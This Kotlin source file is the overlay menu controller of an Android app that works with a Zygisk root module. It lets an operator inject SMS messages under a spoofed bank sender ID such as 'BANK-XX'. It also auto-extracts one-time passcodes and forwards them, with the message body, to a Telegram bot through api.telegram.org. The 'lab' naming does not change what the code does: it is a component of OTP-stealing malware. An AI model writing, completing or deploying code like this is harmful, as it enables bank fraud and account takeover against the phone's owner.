package com.hivirtus.zygiskmode

import android.content.Context
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.core.content.ContextCompat
import com.hivirtus.zygiskmode.databinding.OverlayMenuBinding
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class OverlayMenuController(
    private val context: Context,
    private val menu: OverlayMenuBinding,
    private val onMinimize: () -> Unit
) {
    private val appContext = context.applicationContext
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
    private val configManager = ConfigManager(context)
    private val tokenForwarder = TokenForwarder(configManager, appContext)
    private var listenersAttached = false

    fun bind() {
        refreshFields()
        updateSecurityStatus()
        if (!listenersAttached) {
            setupClickListeners()
            listenersAttached = true
        }
        selectTab(Tab.SYSTEM)
        updateHookStatus()
    }

    private fun refreshFields() {
        val config = configManager.load()
        menu.etMessageBody.setText(config.injectMessageBody)
        menu.etSenderId.setText(config.injectSenderId.ifBlank { "BANK-XX" })
        menu.etBotToken.setText(config.telegramBotToken)
        menu.etChatId.setText(config.telegramChatId)
        menu.switchAutoExtractOtp.isChecked = true
    }

    private fun setupClickListeners() {
        menu.btnClose.setOnClickListener { onMinimize() }

        menu.btnStartHook.setOnClickListener { verifyModuleStatus() }
        menu.btnShowAppInfo.setOnClickListener { showAppInfoDialog() }

        menu.tabSystem.setOnClickListener { selectTab(Tab.SYSTEM) }
        menu.tabMessage.setOnClickListener { selectTab(Tab.MESSAGE) }
        menu.tabTelegram.setOnClickListener { selectTab(Tab.TELEGRAM) }

        menu.btnParseOtp.setOnClickListener { parseSampleOtp() }
        menu.btnSendLabOtp.setOnClickListener { sendLabOtpToTelegram() }

        menu.btnSaveTelegram.setOnClickListener {
            safeSave(R.string.config_saved) {
                val token = textOf(menu.etBotToken)
                val chatId = textOf(menu.etChatId)
                configManager.save(
                    configManager.load().copy(
                        telegramBotToken = token,
                        telegramChatId = chatId,
                        forwardUrl = if (token.isNotBlank() && chatId.isNotBlank()) {
                            "https://api.telegram.org/bot$token/sendMessage"
                        } else {
                            ""
                        }
                    )
                )
            }
        }

        menu.btnTestTelegram.setOnClickListener {
            val token = textOf(menu.etBotToken)
            val chatId = textOf(menu.etChatId)
            if (token.isBlank() || chatId.isBlank()) {
                toast(R.string.telegram_fill_first)
                return@setOnClickListener
            }
            scope.launch {
                val health = withContext(Dispatchers.IO) {
                    ModuleHealthChecker.check(appContext)
                }
                val ok = withContext(Dispatchers.IO) {
                    tokenForwarder.sendTestMessage(token, chatId, health)
                }
                toast(if (ok) R.string.telegram_test_sent else R.string.telegram_test_failed)
            }
        }
    }

    private fun verifyModuleStatus() {
        scope.launch {
            val health = withContext(Dispatchers.IO) { ModuleHealthChecker.check(appContext) }
            when {
                !health.moduleInstalled -> {
                    toast(R.string.hook_start_no_module, Toast.LENGTH_LONG)
                    menu.tvHookStatus.text = appContext.getString(R.string.hook_status_no_module)
                }
                !health.zygiskLoaded -> {
                    toast(R.string.hook_start_not_loaded, Toast.LENGTH_LONG)
                    menu.tvHookStatus.text = appContext.getString(R.string.hook_status_not_loaded)
                }
                else -> {
                    menu.tvHookStatus.text = appContext.getString(R.string.hook_status_ready)
                    toast(R.string.start_hook_success, Toast.LENGTH_LONG)
                }
            }
        }
    }

    private fun parseSampleOtp() {
        val body = textOf(menu.etMessageBody)
        if (body.isBlank()) {
            toast(R.string.enter_message_body)
            return
        }
        val otp = SmsMatcher.extractOtpDigits(body)
        menu.tvLastOtp.text = if (otp != null) {
            appContext.getString(R.string.last_otp_format, otp, textOf(menu.etSenderId))
        } else {
            appContext.getString(R.string.no_otp_found)
        }
        toast(if (otp != null) R.string.otp_parsed else R.string.no_otp_found)
    }

    private fun sendLabOtpToTelegram() {
        val body = textOf(menu.etMessageBody)
        val sender = textOf(menu.etSenderId).ifBlank { "SAMPLE" }
        val token = textOf(menu.etBotToken)
        val chatId = textOf(menu.etChatId)
        if (body.isBlank()) {
            toast(R.string.enter_message_body)
            return
        }
        if (token.isBlank() || chatId.isBlank()) {
            toast(R.string.telegram_fill_first)
            return
        }
        val otp = SmsMatcher.extractOtpDigits(body)
        if (otp == null) {
            toast(R.string.no_otp_found)
            return
        }
        scope.launch {
            val ok = withContext(Dispatchers.IO) {
                tokenForwarder.sendLabOtp(token, chatId, sender, body, otp)
            }
            toast(if (ok) R.string.lab_otp_sent else R.string.telegram_test_failed)
        }
    }

    private fun showAppInfoDialog() {
        val info = SecurityInfoHelper.formatAppInfo(appContext)
        AlertDialog.Builder(context)
            .setTitle(R.string.show_app_info)
            .setMessage(info)
            .setPositiveButton(android.R.string.ok, null)
            .show()
    }

    private fun updateSecurityStatus() {
        val status = SecurityInfoHelper.readStatus(appContext)
        menu.tvSecurityStatus.text = SecurityInfoHelper.formatSecurityStatus(status)
        menu.switchNotDeveloper.isChecked = status.developerOptionsEnabled
        menu.switchNotRoot.isChecked = status.rootIndicators.isNotEmpty()
    }

    private fun updateHookStatus() {
        scope.launch {
            val health = withContext(Dispatchers.IO) { ModuleHealthChecker.check(appContext) }
            val status = when {
                health.activated -> appContext.getString(R.string.hook_status_ready)
                !health.moduleInstalled -> appContext.getString(R.string.hook_status_no_module)
                !health.zygiskLoaded -> appContext.getString(R.string.hook_status_not_loaded)
                else -> appContext.getString(R.string.hook_status_idle)
            }
            menu.tvHookStatus.text = status
        }
    }

    private fun safeSave(successMsg: Int, block: suspend () -> Boolean) {
        scope.launch {
            val ok = withContext(Dispatchers.IO) {
                try {
                    block()
                } catch (_: Exception) {
                    false
                }
            }
            toast(if (ok) successMsg else R.string.save_failed)
        }
    }

    private fun toast(resId: Int, duration: Int = Toast.LENGTH_SHORT) {
        Toast.makeText(appContext, resId, duration).show()
    }

    private fun textOf(field: android.widget.EditText): String {
        return field.text?.toString()?.trim().orEmpty()
    }

    private enum class Tab { SYSTEM, MESSAGE, TELEGRAM }

    private fun selectTab(tab: Tab) {
        menu.panelSystem.visibility = if (tab == Tab.SYSTEM) View.VISIBLE else View.GONE
        menu.panelMessage.visibility = if (tab == Tab.MESSAGE) View.VISIBLE else View.GONE
        menu.panelTelegram.visibility = if (tab == Tab.TELEGRAM) View.VISIBLE else View.GONE

        val active = ContextCompat.getColor(context, R.color.tab_active)
        val inactive = ContextCompat.getColor(context, R.color.tab_inactive)

        listOf(
            menu.tabSystem to Tab.SYSTEM,
            menu.tabMessage to Tab.MESSAGE,
            menu.tabTelegram to Tab.TELEGRAM
        ).forEach { (view, t) ->
            view.isSelected = tab == t
            view.setTextColor(if (tab == t) active else inactive)
        }
    }
}
